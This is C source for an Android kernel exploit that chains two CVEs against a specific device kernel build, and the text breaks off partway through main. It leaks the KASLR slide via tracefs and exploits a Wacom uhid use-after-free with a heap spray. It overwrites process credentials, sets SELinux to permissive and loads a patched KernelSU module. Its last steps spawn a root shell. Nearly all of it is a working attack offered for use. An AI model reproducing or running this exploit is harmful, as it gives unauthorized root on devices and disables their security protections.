// CVE-2026-99491 + CVE-2026-98499 chain port for WKL-AN20 117 / 6.18.21.
//
// Stages:
//   slide : leak KASLR slide through the 117 posix_timers_cache kmem trace
//           (same tracefs primitive used by the 98260 slide probe)
//   cred  : fork+exec a wait child and find its committed cred through
//           prepare_creds' cred_jar allocation
//   pwn   : find the live cred with a zero-write euid oracle, zero
//           uid/gid/euid/egid/fsuid/fsgid, install caps, then exec a shell
//
// The write primitive is the 117 wacom touch_input UAF: destroy the touch
// sibling, reclaim its 0x640-byte input_dev with a 1600-byte uhid descriptor
// buffer laid out as a fake input_dev, then send the pad MUTE report.  The
// fake input_dev's vals pointer is the write target; input_event_dispose()
// stores one 8-byte input_value there.  With EV_SW asserted the word is
// {EV_SW, SW_MUTE_DEVICE, 0/1}; with EV_SYN and sw[] clear the switch event
// is dropped and input_sync() writes eight zero bytes.
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/module.h>
#include <linux/uhid.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "rdesc_gen.h"

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"

/* 117 link-time addresses (vmlinux-117.elf, 2026-10-12 build). */
#define TIMER_LINK       0xffffffc0803e0460ULL
#define TIMER_SITE_LOW   0x1e0460UL
#define TIMER_REQ        0x180ULL
#define CRED_LINK        0xffffffc08014dca0ULL
#define CRED_REQ         0xb8ULL
#define AVC_LINK         0xffffffc0802392f8ULL
#define SELINUX_LINK     0xffffffc08299a6f0ULL

/* 117 struct input_dev (disassembly of input_event/dispose). */
#define DEV_EVBIT        0x28
#define DEV_SWBIT        0xc8
#define DEV_SW           0x1c0
#define DEV_EVENT        0x1e0
#define DEV_GRAB         0x1e8
#define DEV_EVENT_LOCK   0x1f0
#define DEV_NUM_VALS     0x5e8
#define DEV_MAX_VALS     0x5ec
#define DEV_VALS         0x5f0
#define DEV_INHIBITED    0x618
#define DEV_SIZE         0x640

/* 117 struct cred (prepare_creds memmove size 0xb8). */
#define CRED_SIZE        0xb8
#define CRED_UID         0x8
#define CRED_EUID        0x18
#define CRED_FSUID       0x20
#define CRED_CAP_PERM    0x38
#define CRED_CAP_EFF     0x40
#define CRED_CAP_BSET    0x48

#define SPRAY_MAX        1024
#define SPRAY_PAIRS      24
#define SPRAY_LEN        1664
#define CHILD_HELLO      0x9941cce1U

#define WACOM_VID        0x056a
#define PHYS_COMMON      "uhid/wacom"

static unsigned child_fsuid(void);
static unsigned selinux_enforce_now(void);
static int loadksu_main(void);
static int g_verbose = 1;
static int g_no_caps;
static int g_switch_state;
static int g_spray_fake = 512;
static int g_load_only;
static int g_no_avc;
static int g_avc_only;
static int g_avc_test;
static int g_store_count;
static int g_pre_reports = 1;
static int g_switch_state_set;
static int g_prepatched;
static uint64_t g_avc_off = 0x0c;
static unsigned g_pad_value = 1;
#define P(...) do { if (g_verbose) { printf(__VA_ARGS__); fflush(stdout); } } while (0)

static long now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
}

static int write_file_mode(const char *path, const char *s, int mode) {
    int fd = open(path, O_WRONLY | O_CLOEXEC | mode);
    if (fd < 0) return -1;
    ssize_t n = write(fd, s, strlen(s));
    close(fd);
    return n == (ssize_t)strlen(s) ? 0 : -1;
}
static int write_file(const char *path, const char *s) {
    return write_file_mode(path, s, 0);
}

static void kick_rss(void) {
    size_t n = 4UL << 20;
    unsigned char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) return;
    for (size_t i = 0; i < n; i += 4096) p[i] = 1;
    munmap(p, n);
}

static int trace_enable_kmem(void) {
    write_file(TRACE "/buffer_size_kb", "4096\n");
    write_file(TRIGGER, "!enable_event:kmem:kmem_cache_alloc\n");
    write_file(TRIGGER, "!enable_event:kmem:kmalloc\n");
    if (write_file(TRIGGER, "enable_event:kmem:kmem_cache_alloc\n") != 0)
        return -1;
    write_file(TRIGGER, "enable_event:kmem:kmalloc\n");
    write_file(TRACE "/tracing_on", "0\n");
    int fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
    if (fd >= 0) close(fd);
    write_file(TRACE "/tracing_on", "1\n");
    kick_rss();
    return 0;
}

static void trace_reset(void) {
    write_file(TRACE "/tracing_on", "0\n");
    int fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
    if (fd >= 0) close(fd);
    write_file(TRACE "/tracing_on", "1\n");
}

static void trace_off(void) {
    write_file(TRACE "/tracing_on", "0\n");
}

static long read_raw_cpu0(unsigned char *buf, size_t cap) {
    int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
                  O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) return -1;
    size_t used = 0;
    while (used + 4096 < cap) {
        ssize_t n = read(fd, buf + used, cap - used);
        if (n < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (n == 0) break;
        used += (size_t)n;
    }
    close(fd);
    return (long)used;
}

/* Find kmem records whose call_site is `site` and bytes_req is `bytes`.
 * The 117 trace record layout used by the 98260 probes is:
 *   +0 call_site, +8 ptr, +24 bytes_req. */
static int collect_site_pid(const unsigned char *buf, size_t used,
                            uint64_t site, uint64_t bytes, int pid,
                            uint64_t *out, int cap) {
    int n = 0;
    int seen = 0;
    for (size_t i = 4; i + 32 <= used; i++) {
        uint64_t got, ptr, req;
        int rpid;
        memcpy(&got, buf + i, 8);
        if (got != site) continue;
        memcpy(&ptr, buf + i + 8, 8);
        memcpy(&req, buf + i + 24, 8);
        memcpy(&rpid, buf + i - 4, 4);
        if (seen < 3) {
            P("[*] cred rec pid=%d req=%#llx ptr=%#llx\n",
              rpid, (unsigned long long)req, (unsigned long long)ptr);
            seen++;
        }
        if (pid >= 0 && rpid != pid) continue;
        if (req != bytes) continue;
        if ((ptr >> 48) != 0xffff || (ptr & 7)) continue;
        if (n < cap) out[n++] = ptr;
    }
    return n;
}

static uint64_t find_slide(const unsigned char *buf, size_t used) {
    for (size_t i = 0; i + 32 <= used; i++) {
        uint64_t site, ptr, req;
        memcpy(&site, buf + i, 8);
        if ((site >> 48) != 0xffff) continue;
        if ((site & 0x1fffff) != TIMER_SITE_LOW) continue;
        memcpy(&ptr, buf + i + 8, 8);
        memcpy(&req, buf + i + 24, 8);
        (void)ptr;
        if (req != TIMER_REQ) continue;
        return site;
    }
    return 0;
}

static uint64_t leak_slide(void) {
    unsigned char *buf = malloc(8UL << 20);
    if (!buf) return 0;
    for (int attempt = 0; attempt < 12; attempt++) {
        if (trace_enable_kmem() != 0) {
            P("[-] trace enable failed\n");
            free(buf);
            return 0;
        }
        struct sigevent ev;
        timer_t id;
        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0)
            timer_delete(id);
        trace_off();
        long used = read_raw_cpu0(buf, 8UL << 20);
        if (used > 0) {
            uint64_t site = find_slide(buf, (size_t)used);
            if (site) {
                uint64_t slide = site - TIMER_LINK;
                if (slide > 0 && (slide & 0xfff) == 0) {
                    P("[+] timer site=%#llx slide=%#llx\n",
                      (unsigned long long)site, (unsigned long long)slide);
                    free(buf);
                    return slide;
                }
            }
        }
        P("[*] slide attempt %d failed (raw=%ld)\n", attempt + 1, used);
        usleep(50000);
    }
    free(buf);
    return 0;
}

/* ---------------- uhid pair / 99491 write primitive ---------------- */

struct udev {
    int fd;
    int started;
};

static int uhid_open_dev(void) {
    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (fd < 0) P("[-] open /dev/uhid: %s\n", strerror(errno));
    return fd;
}

static int uhid_create2(int fd, const char *name, const char *phys,
                        unsigned pid, const unsigned char *rd, size_t rlen) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    snprintf((char *)ev.u.create2.name, sizeof(ev.u.create2.name), "%s", name);
    snprintf((char *)ev.u.create2.phys, sizeof(ev.u.create2.phys), "%s", phys);
    snprintf((char *)ev.u.create2.uniq, sizeof(ev.u.create2.uniq), "cve99491");
    ev.u.create2.rd_size = (uint16_t)rlen;
    memcpy(ev.u.create2.rd_data, rd, rlen);
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    ev.u.create2.version = 0x0106;
    ssize_t w = write(fd, &ev, sizeof(ev));
    if (w != (ssize_t)sizeof(ev)) {
        P("[-] UHID_CREATE2(%s) w=%zd errno=%d\n", name, w, errno);
        return -1;
    }
    return 0;
}

static void uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    (void)!write(fd, &ev, sizeof(ev));
}

static int handle_uhid_event(struct udev *u) {
    struct uhid_event ev;
    ssize_t n = read(u->fd, &ev, sizeof(ev));
    if (n <= 0) return -1;
    if (ev.type == UHID_START) {
        u->started = 1;
    } else if (ev.type == UHID_GET_REPORT) {
        struct uhid_event r;
        memset(&r, 0, sizeof(r));
        r.type = UHID_GET_REPORT_REPLY;
        r.u.get_report_reply.id = ev.u.get_report.id;
        r.u.get_report_reply.size = 0;
        (void)!write(u->fd, &r, sizeof(r));
    } else if (ev.type == UHID_SET_REPORT) {
        struct uhid_event r;
        memset(&r, 0, sizeof(r));
        r.type = UHID_SET_REPORT_REPLY;
        r.u.set_report_reply.id = ev.u.set_report.id;
        (void)!write(u->fd, &r, sizeof(r));
    }
    return 0;
}

static void pump_pair(struct udev *a, struct udev *b, int ms) {
    struct pollfd pfd[2];
    int n = 0;
    if (a && a->fd >= 0) { pfd[n].fd = a->fd; pfd[n].events = POLLIN; n++; }
    if (b && b->fd >= 0) { pfd[n].fd = b->fd; pfd[n].events = POLLIN; n++; }
    if (!n) return;
    if (poll(pfd, n, ms) <= 0) return;
    for (int i = 0; i < n; i++) {
        if (!(pfd[i].revents & POLLIN)) continue;
        struct udev *u = (a && pfd[i].fd == a->fd) ? a : b;
        handle_uhid_event(u);
    }
}

static int wait_started(struct udev *a, struct udev *b, int ms) {
    long dl = now_ms() + ms;
    while (now_ms() < dl) {
        if ((!a || a->started) && (!b || b->started)) return 0;
        pump_pair(a, b, 25);
    }
    return -1;
}

static int make_pair(struct udev *a, struct udev *b) {
    memset(a, 0, sizeof(*a));
    memset(b, 0, sizeof(*b));
    a->fd = b->fd = -1;
    a->fd = uhid_open_dev();
    b->fd = uhid_open_dev();
    if (a->fd < 0 || b->fd < 0) return -1;
    if (uhid_create2(a->fd, "Wacom Cintiq 27QHD Pen", PHYS_COMMON,
                     0x032b, rdesc_i5pen, rdesc_i5pen_len) != 0)
        return -1;
    if (wait_started(a, NULL, 4000) != 0) {
        P("[-] A did not start\n");
        return -1;
    }
    for (int i = 0; i < 10; i++) pump_pair(a, NULL, 25);
    usleep(150000);
    if (uhid_create2(b->fd, "Wacom Cintiq 27QHD touch Touch", PHYS_COMMON,
                     0x032c, rdesc_touch, rdesc_touch_len) != 0)
        return -1;
    if (wait_started(a, b, 4000) != 0) {
        P("[-] B did not start\n");
        return -1;
    }
    for (int i = 0; i < 12; i++) pump_pair(a, b, 25);
    return 0;
}

static int send_pad(int fd, int n) {
    for (int i = 0; i < n; i++) {
        struct uhid_event ev;
        memset(&ev, 0, sizeof(ev));
        ev.type = UHID_INPUT2;
        ev.u.input2.size = 10;
        ev.u.input2.data[0] = 0x03; /* WACOM_REPORT_INTUOS5PAD */
        ev.u.input2.data[2] = 0x04; /* touch mute toggle */
        ev.u.input2.data[3] = (unsigned char)g_pad_value;
        if (write(fd, &ev, sizeof(ev)) != (ssize_t)sizeof(ev)) {
            P("[-] pad write errno=%d\n", errno);
            return -1;
        }
    }
    return 0;
}

static int spray_fd[SPRAY_PAIRS][2];

static int spray_setup(void) {
    int rcv = 1048576;
    for (int p = 0; p < SPRAY_PAIRS; p++) {
        spray_fd[p][0] = spray_fd[p][1] = -1;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_fd[p]) < 0)
            return -1;
        for (int e = 0; e < 2; e++) {
            setsockopt(spray_fd[p][e], SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
            setsockopt(spray_fd[p][e], SOL_SOCKET, SO_SNDBUF, &rcv, sizeof(rcv));
        }
    }
    return 0;
}

static int spray_fire(long n, const unsigned char *buf) {
    cpu_set_t saved, one;
    if (sched_getaffinity(0, sizeof(saved), &saved) < 0)
        return -1;
    long per_cpu = n / 8;
    for (int c = 0; c < 8; c++) {
        if (!CPU_ISSET(c, &saved))
            continue;
        CPU_ZERO(&one);
        CPU_SET(c, &one);
        sched_setaffinity(0, sizeof(one), &one);
        for (long i = 0; i < per_cpu; i++) {
            int p = (int)(i % SPRAY_PAIRS);
            if (write(spray_fd[p][0], buf, SPRAY_LEN) != (ssize_t)SPRAY_LEN) {
                sched_setaffinity(0, sizeof(saved), &saved);
                return -1;
            }
        }
    }
    sched_setaffinity(0, sizeof(saved), &saved);
    return 0;
}

static int spray_spread(long n, long ms, const unsigned char *buf) {
    const long chunk = 384;
    long chunks = (n + chunk - 1) / chunk;
    long gap_us = chunks > 1 ? ms * 1000 / (chunks - 1) : 0;
    if (gap_us < 1000) gap_us = 1000;
    for (long c = 0; c < chunks; c++) {
        long k = (c == chunks - 1) ? n - chunk * (chunks - 1) : chunk;
        if (k > 0 && spray_fire(k, buf) < 0)
            return -1;
        if (c < chunks - 1) usleep(gap_us);
    }
    return 0;
}

static void spray_drain(void) {
    unsigned char tmp[65536];
    for (int p = 0; p < SPRAY_PAIRS; p++) {
        if (spray_fd[p][1] < 0) continue;
        for (;;) {
            ssize_t n = recv(spray_fd[p][1], tmp, sizeof(tmp), MSG_DONTWAIT);
            if (n <= 0) break;
        }
    }
}

static void build_fake_input_dev(unsigned char *buf, size_t len,
                                 uint64_t vals_target, int syn_zero) {
    memset(buf, 0, len);
    /* Invalid HID long item: make hid_parse_report() fail so the fake
     * uhid devices do not allocate competing input_dev objects. */
    buf[0] = 0xfe; buf[1] = 0xff; buf[2] = 0x00; buf[3] = 0x00;
    uint64_t evbit, swbit, sw_state;
    if (syn_zero) {
        evbit = 0x21ULL;   /* EV_SYN|EV_SW */
        swbit = 0;         /* drop EV_SW, leaving only the SYN zero word */
        sw_state = 0;
    } else {
        evbit = 0x20ULL;   /* EV_SW only; EV_SYN is dropped */
        swbit = 1ULL << 14;
        sw_state = g_switch_state ? (1ULL << 14) : 0;
    }
    unsigned num_vals = 0;
    unsigned max_vals = 0x1000;
    memcpy(buf + DEV_EVBIT, &evbit, 8);
    memcpy(buf + DEV_SWBIT, &swbit, 8);
    memcpy(buf + DEV_SW, &sw_state, 8);
    memcpy(buf + DEV_NUM_VALS, &num_vals, 4);
    memcpy(buf + DEV_MAX_VALS, &max_vals, 4);
    memcpy(buf + DEV_VALS, &vals_target, 8);
    /* event@0x1e0, grab@0x1e8, event_lock@0x1f0, inhibited@0x618 stay 0 */
}

static int direct_uaf_write_n(uint64_t target, int syn_zero, int reports) {
    struct udev a, b;
    int fake[SPRAY_MAX];
    unsigned char *payload = malloc(SPRAY_LEN);
    int rc = -1;

    if (g_spray_fake > SPRAY_MAX) g_spray_fake = SPRAY_MAX;
    for (int i = 0; i < g_spray_fake; i++) fake[i] = -1;
    if (!payload) return -1;
    if (make_pair(&a, &b) != 0) goto out;
    for (int r = 0; r < g_pre_reports; r++) {
        send_pad(a.fd, 1);
        usleep(3000);
    }
    usleep(50000);
    uhid_destroy(b.fd);
    close(b.fd);
    b.fd = -1;
    usleep(500000); /* evdev reference delays the input_dev free */
    build_fake_input_dev(payload, SPRAY_LEN, target, syn_zero);
    for (int i = 0; i < g_spray_fake; i++) {
        fake[i] = uhid_open_dev();
        if (fake[i] < 0) break;
        if (uhid_create2(fake[i], "fakeinput", "fake/wacom",
                         0x5678, payload, SPRAY_LEN) != 0) {
            close(fake[i]);
            fake[i] = -1;
            break;
        }
    }
    for (int r = 0; r < reports; r++) {
        send_pad(a.fd, 1);
        usleep(3000);
    }
    usleep(200000);
    rc = 0;
out:
    if (a.fd >= 0) { uhid_destroy(a.fd); close(a.fd); }
    if (b.fd >= 0) { uhid_destroy(b.fd); close(b.fd); }
    for (int i = 0; i < g_spray_fake; i++) if (fake[i] >= 0) close(fake[i]);
    free(payload);
    return rc;
}

static int direct_uaf_write(uint64_t target, int syn_zero) {
    return direct_uaf_write_n(target, syn_zero, 32);
}

static uint64_t find_avc_node(const unsigned char *buf, size_t used, int pid) {
    uint64_t last = 0;
    for (size_t i = 4; i + 32 <= used; i++) {
        uint64_t site, ptr;
        int rpid;
        memcpy(&site, buf + i, 8);
        unsigned long low = (unsigned long)(site & 0x1fffff);
        if (low != 0x1478dcUL && low != 0x392f8UL) continue;
        memcpy(&ptr, buf + i + 8, 8);
        memcpy(&rpid, buf + i - 4, 4);
        if (pid >= 0 && rpid != pid) continue;
        if ((ptr >> 48) != 0xffff || (ptr & 7)) continue;
        last = ptr;
    }
    return last;
}

static int module_live(void) {
    FILE *f = fopen("/proc/modules", "r");
    char line[256];
    if (!f) return 0;
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "kernelsu ", 9)) { fclose(f); return 1; }
    }
    fclose(f);
    return 0;
}

static int run_cmd(const char *cmd) {
    P("[cmd] %s\n", cmd);
    int rc = system(cmd);
    P("[cmd] rc=%d\n", rc);
    return rc;
}

static int read_caps(uint64_t caps[2]) {
    caps[0] = caps[1] = 0;
    int sf = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
    if (sf < 0) return -1;
    char sb[4096];
    int sl = (int)read(sf, sb, sizeof(sb) - 1);
    close(sf);
    if (sl <= 0) return -1;
    sb[sl] = 0;
    char *p = strstr(sb, "CapEff:");
    if (p) caps[0] = strtoull(p + 7, NULL, 16);
    p = strstr(sb, "CapBnd:");
    if (p) caps[1] = strtoull(p + 7, NULL, 16);
    return 0;
}

static int loadksu_main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    P("=== LOADKSU uid=%u euid=%u fsuid=%u enforce=%u ===\n",
      (unsigned)getuid(), (unsigned)geteuid(), child_fsuid(),
      selinux_enforce_now());
    {
        uint64_t cap[2] = { 0, 0 };
        if (read_caps(cap) == 0)
            P("[ksu] caps eff=%#llx bnd=%#llx\n",
              (unsigned long long)cap[0], (unsigned long long)cap[1]);
    }
    {
        char mb[16] = "";
        int mf = open("/proc/sys/kernel/modules_disabled", O_RDONLY | O_CLOEXEC);
        if (mf >= 0) {
            int mn = (int)read(mf, mb, sizeof(mb) - 1);
            close(mf);
            if (mn > 0) { mb[mn] = 0; P("[ksu] modules_disabled=%s", mb); }
        }
    }
    int fd = open("/data/local/tmp/ksu-patched.ko", O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        P("[-] open ksu-patched.ko: %s\n", strerror(errno));
        return 1;
    }
    const unsigned int flags[] = {
        0,
        MODULE_INIT_IGNORE_MODVERSIONS,
        MODULE_INIT_IGNORE_MODVERSIONS | MODULE_INIT_IGNORE_VERMAGIC,
    };
    int loaded = 0;
    for (unsigned i = 0; i < sizeof(flags) / sizeof(flags[0]); i++) {
        if (i) {
            close(fd);
            fd = open("/data/local/tmp/ksu-patched.ko", O_RDONLY | O_CLOEXEC);
            if (fd < 0) break;
        }
        errno = 0;
        long rc = syscall(SYS_finit_module, fd, "allow_shell=1", flags[i]);
        int e = errno;
        P("[ksu] finit_module flags=%#x rc=%ld errno=%d (%s)\n",
          flags[i], rc, e, strerror(e));
        if (rc == 0 || module_live()) { loaded = 1; break; }
    }
    if (fd >= 0) close(fd);
    write_file("/sys/fs/selinux/enforce", "1\n");
    P("[ksu] module_live=%d enforce=%u\n", module_live(), selinux_enforce_now());
    if (!loaded) return 1;
    if (g_load_only) {
        P("=== LOADKSU DONE module_live=%d enforce=%u load_only=1 ===\n",
          module_live(), selinux_enforce_now());
        return 0;
    }

    run_cmd("mkdir -p /data/adb/ksu/bin /data/adb/modules");
    run_cmd("/data/local/tmp/ksud install");
    run_cmd("/system/bin/sh /data/local/tmp/root_stage.sh /data/local/tmp");
    run_cmd("/system/bin/su -c 'id; getenforce; cat /proc/self/attr/current'");
    P("=== LOADKSU DONE module_live=%d enforce=%u ===\n",
      module_live(), selinux_enforce_now());
    return 0;
}

static int prepatch_module(uint64_t slide) {
    char rel[128] = "";
    struct utsname u;
    if (uname(&u) == 0) snprintf(rel, sizeof(rel), "%s", u.release);
    if (!rel[0]) snprintf(rel, sizeof(rel),
        "6.18.21-android17-5-gfee2325de189-abogki572422516-4k");
    char sh[32];
    snprintf(sh, sizeof(sh), "%#llx", (unsigned long long)slide);
    pid_t p = fork();
    if (p == 0) {
        execl("/data/local/tmp/ko_patch", "ko_patch",
              "/data/local/tmp/ksu-template-117.ko",
              "/data/local/tmp/ksu-patched.ko",
              "/data/local/tmp/ko_syms-117.txt",
              sh, rel, (char *)NULL);
        _exit(127);
    }
    if (p < 0) return -1;
    int st = 0;
    waitpid(p, &st, 0);
    P("[ksu] prepatch status=%#x slide=%s\n", st, sh);
    return (WIFEXITED(st) && WEXITSTATUS(st) == 0) ? 0 : -1;
}

/* ---------------- wait child ---------------- */

static unsigned child_fsuid(void) {
    char sb[2048];
    int f = open("/proc/self/status", O_RDONLY);
    unsigned a = 0, b = 0, c = 0, d = 0;
    if (f < 0) return 0xffffffffu;
    int n = (int)read(f, sb, sizeof(sb) - 1);
    close(f);
    if (n <= 0) return 0xffffffffu;
    sb[n] = 0;
    char *p = strstr(sb, "\nUid:");
    if (!p || sscanf(p + 1, "Uid:\t%u\t%u\t%u\t%u", &a, &b, &c, &d) < 4)
        return 0xffffffffu;
    return d;
}

static unsigned selinux_enforce_now(void) {
    char b[8];
    int f = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (f < 0) return 0xffffffffu;
    int n = (int)read(f, b, sizeof(b) - 1);
    close(f);
    if (n <= 0) return 0xffffffffu;
    b[n] = 0;
    return (unsigned)atoi(b);
}

static int wait_child_main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint32_t hello = CHILD_HELLO;
    (void)!write(4, &hello, sizeof(hello));
    for (;;) {
        char c;
        if (read(3, &c, 1) != 1) {
            usleep(10000);
            continue;
        }
        if (c == 'S') {
            uint32_t vals[8] = {0};
            char sb[4096];
            int sf = open("/proc/self/status", O_RDONLY);
            if (sf >= 0) {
                int sl = (int)read(sf, sb, sizeof(sb) - 1);
                close(sf);
                if (sl > 0) {
                    sb[sl] = 0;
                    char *p = strstr(sb, "\nUid:");
                    if (p) sscanf(p + 1, "Uid:\t%u\t%u\t%u\t%u",
                                  &vals[0], &vals[1], &vals[2], &vals[3]);
                    p = strstr(sb, "\nGid:");
                    if (p) sscanf(p + 1, "Gid:\t%u\t%u\t%u\t%u",
                                  &vals[4], &vals[5], &vals[6], &vals[7]);
                }
            }
            (void)!write(4, vals, sizeof(vals));
        } else if (c == 'E') {
            uint32_t eu = (uint32_t)geteuid();
            (void)!write(4, &eu, 4);
        } else if (c == 'U') {
            uint32_t ug[2] = { (uint32_t)getuid(), (uint32_t)getgid() };
            (void)!write(4, ug, sizeof(ug));
        } else if (c == 'C') {
            uint64_t caps[2] = { 0, 0 };
            (void)read_caps(caps);
            (void)!write(4, caps, sizeof(caps));
        } else if (c == 'B') {
            unsigned long long node = 0;
            int open_ok = 0, oerr = 0;
            unsigned fsu = child_fsuid();
            unsigned char *tb = malloc(8UL << 20);
            trace_reset();
            int ef = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
            if (ef >= 0) {
                open_ok = 1;
                (void)!write(ef, "0", 1);
                close(ef);
            } else {
                oerr = errno;
            }
            trace_off();
            if (tb) {
                long tn = read_raw_cpu0(tb, 8UL << 20);
                if (open_ok && tn > 0)
                    node = (unsigned long long)find_avc_node(tb, (size_t)tn, (int)getpid());
                free(tb);
            }
            /* The child does not know the slide; report just open/fsuid. */
            struct { uint64_t node; uint32_t open_ok, oerr, fsuid; } rb;
            rb.node = node; rb.open_ok = (uint32_t)open_ok;
            rb.oerr = (uint32_t)oerr; rb.fsuid = fsu;
            (void)!write(4, &rb, sizeof(rb));
        } else if (c == 'R') {
            uint32_t enf = 0xffffffffu;
            int ef = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
            if (ef >= 0) {
                (void)!write(ef, "0", 1);
                close(ef);
            }
            enf = selinux_enforce_now();
            (void)!write(4, &enf, sizeof(enf));
        } else if (c == 'L') {
            /* Stay in this process: execve() recomputes permitted/effective
             * from cap_bset, which would drop CAP_SYS_MODULE again. */
            int lr = loadksu_main();
            _exit(lr == 0 ? 0 : 1);
        } else if (c == 'X') {
            int of = open("/dev/console", O_WRONLY | O_CLOEXEC);
            if (of >= 0) { dup2(of, 1); dup2(of, 2); if (of > 2) close(of); }
            execl("/system/bin/sh", "sh", "-c",
                  "echo '=== CHILD ROOT SHELL ==='; id; getenforce; "
                  "cat /proc/self/attr/current; "
                  "grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd):' /proc/self/status",
                  (char *)NULL);
            _exit(111);
        } else if (c == 'Q') {
            _exit(0);
        }
    }
}

static pid_t spawn_wait_child(int cpu, int *go_out, int *st_out) {
    int go[2], st[2];
    if (pipe(go) || pipe(st)) return -1;
    pid_t p = fork();
    if (p == 0) {
        char ch;
        int g2, s2;
        cpu_set_t set;
        close(go[1]); close(st[0]);
        CPU_ZERO(&set); CPU_SET(cpu, &set);
        sched_setaffinity(0, sizeof(set), &set);
        g2 = fcntl(go[0], F_DUPFD, 20);
        s2 = fcntl(st[1], F_DUPFD, 20);
        if (g2 < 0 || s2 < 0) _exit(125);
        close(go[0]); close(st[1]);
        dup2(g2, 3); close(g2);
        dup2(s2, 4); close(s2);
        if (read(3, &ch, 1) != 1) _exit(126);
        execl("/proc/self/exe", "exp117", "wait", (char *)NULL);
        _exit(127);
    }
    if (p < 0) return -1;
    close(go[0]); close(st[1]);
    *go_out = go[1]; *st_out = st[0];
    return p;
}

static int read_full(int fd, void *buf, size_t n) {
    unsigned char *p = buf;
    size_t got = 0;
    while (got < n) {
        ssize_t r = read(fd, p + got, n - got);
        if (r <= 0) return -1;
        got += (size_t)r;
    }
    return 0;
}

static int leak_child_creds(uint64_t slide, uint64_t *ptrs, int cap,
                            pid_t *child_out, int *go_out, int *st_out) {
    unsigned char *raw = malloc(8UL << 20);
    if (!raw) return -1;
    int go = -1, st = -1;
    pid_t c = spawn_wait_child(0, &go, &st);
    if (c < 0) { free(raw); return -1; }
    trace_reset();
    (void)!write(go, "A", 1);
    uint32_t h = 0;
    if (read_full(st, &h, sizeof(h)) != 0 || h != CHILD_HELLO) {
        P("[-] child hello failed h=%#x\n", h);
        close(go); close(st); free(raw);
        return -1;
    }
    trace_off();
    long used = read_raw_cpu0(raw, 8UL << 20);
    int n = 0;
    if (used > 0)
        n = collect_site_pid(raw, (size_t)used, CRED_LINK + slide, CRED_REQ,
                             (int)c, ptrs, cap);
    free(raw);
    P("[*] cred trace raw=%ld candidates=%d\n", used, n);
    for (int i = 0; i < n; i++)
        P("[*] cred[%d]=%#llx\n", i, (unsigned long long)ptrs[i]);
    if (n <= 0) {
        close(go); close(st); kill(c, SIGKILL); waitpid(c, NULL, 0);
        return -1;
    }
    *child_out = c; *go_out = go; *st_out = st;
    return n;
}

static int cmd_euid(int go, int st, uint32_t *eu) {
    if (write(go, "E", 1) != 1) return -1;
    return read_full(st, eu, 4);
}
static int cmd_uidgid(int go, int st, uint32_t ug[2]) {
    if (write(go, "U", 1) != 1) return -1;
    return read_full(st, ug, 8);
}
static int cmd_caps(int go, int st, uint64_t caps[2]) {
    if (write(go, "C", 1) != 1) return -1;
    return read_full(st, caps, 16);
}

static void usage(const char *p) {
    fprintf(stderr, "usage: %s [--stage slide|cred|pwn] [--spray N] [--pre N] [--load-only] [--no-avc] [--avc-only] [--avc-test] [--no-caps] [--prepatched]\n", p);
}

int main(int argc, char **argv) {
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main();
    if (argc > 1 && !strcmp(argv[1], "loadksu"))
        return loadksu_main();
    setvbuf(stdout, NULL, _IONBF, 0);

    const char *stage = "pwn";
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--stage") && i + 1 < argc)
            stage = argv[++i];
        else if (!strcmp(argv[i], "--quiet"))
            g_verbose = 0;
        else if (!strcmp(argv[i], "--no-caps"))
            g_no_caps = 1;
        else if (!strcmp(argv[i], "--prepatched"))
            g_prepatched = 1;
        else if (!strcmp(argv[i], "--load-only"))
            g_load_only = 1;
        else if (!strcmp(argv[i], "--no-avc"))
            g_no_avc = 1;
        else if (!strcmp(argv[i], "--avc-only"))
            g_avc_only = 1;
        else if (!strcmp(argv[i], "--avc-test"))
            g_avc_test = 1;
        else if (!strcmp(argv[i], "--avc-offset") && i + 1 < argc)
            g_avc_off = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--store-count"))
            g_store_count = 1;
        else if (!strcmp(argv[i], "--switch-state") && i + 1 < argc) {
            g_switch_state = atoi(argv[++i]);
            g_switch_state_set = 1;
        }
